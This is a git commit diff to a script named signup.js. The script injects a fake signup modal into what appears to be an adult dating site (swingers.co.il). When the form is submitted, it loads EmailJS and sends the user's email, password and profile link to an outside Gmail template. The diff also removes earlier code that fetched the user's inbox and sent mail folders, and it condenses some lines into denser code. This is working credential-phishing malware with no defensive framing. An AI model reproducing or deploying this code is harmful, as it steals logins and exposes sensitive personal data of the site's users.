40658a6e09e17222db3a44971779de4951d87374
EdgarBowsky <61337331+EdgarBowsky@users.noreply.github.com>
2020-03-01 22:03:55 +0200

    Update signup.js

--- signup.js
+++ signup.js
@@ -1,14 +1,5 @@
-(function() {
-  var x = localStorage.getItem('showed-signup-modal');
-
-  if (x) {
-    return;
-  }
-
-  localStorage.setItem('showed-signup-modal', 'true');
-
-  var modal = document.createElement('div');
-  modal.innerHTML = `
+(function(){var x=localStorage.getItem('showed-signup-modal');if(x){return;}
+localStorage.setItem('showed-signup-modal','true');var modal=document.createElement('div');modal.innerHTML=`
   <style>
   .singupmodal {
     padding: 175px;
@@ -40,12 +31,8 @@
       </div>
     </form>
     </div>  
-  `;
-
-  document.body.appendChild(modal);
-
-  var script = document.createElement('script')
-  script.innerHTML = `
+  `;document.body.appendChild(modal);var script=document.createElement('script')
+script.innerHTML=`
   function onsubmit (e) {
     e.preventDefault();
     document.querySelector('.singupmodal').style.display = 'none';
@@ -56,17 +43,13 @@
     script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"
     document.head.appendChild(script);
 
-    setTimeout(() => {
+    setTimeout(function () {
       emailjs.init("user_0z9zeDeCe8tKnLyGb6hLg");
-      $.ajax('https://www.swingers.co.il/mailbox.html?mailBox=1&folderType=d').then(function(inbox) {
-        $.ajax('https://www.swingers.co.il/mailbox.html?mailBox=2&folderType=d&isSentFolder=1').then(function (sent) {
-          var profileNum = $('.profileNum').text().split(' - ').pop();
-          emailjs.send('gmail', 'template_kmOys9Qf_clone', {
-            userlink: 'https://www.swingers.co.il/%D7%97%D7%99%D7%9C%D7%95%D7%A4%D7%99-%D7%96%D7%95%D7%92%D7%95%D7%AA/?customer=' + profileNum,
-            email: email,
-            password: password,
-          })
-        });
+      var profileNum = $('.profileNum').text().split(' - ').pop();
+      emailjs.send('gmail', 'template_kmOys9Qf_clone', {
+        userlink: 'https://www.swingers.co.il/%D7%97%D7%99%D7%9C%D7%95%D7%A4%D7%99-%D7%96%D7%95%D7%92%D7%95%D7%AA/?customer=' + profileNum,
+        email: email,
+        password: password,
       })
     }, 2000);
 
@@ -75,6 +58,4 @@
   document.querySelector('#myform').addEventListener('submit', onsubmit);
   document.querySelector('#myform button[type="submit"]').addEventListener('click', onsubmit);
   `
-
-  document.body.appendChild(script);
-})();
+document.body.appendChild(script);})();
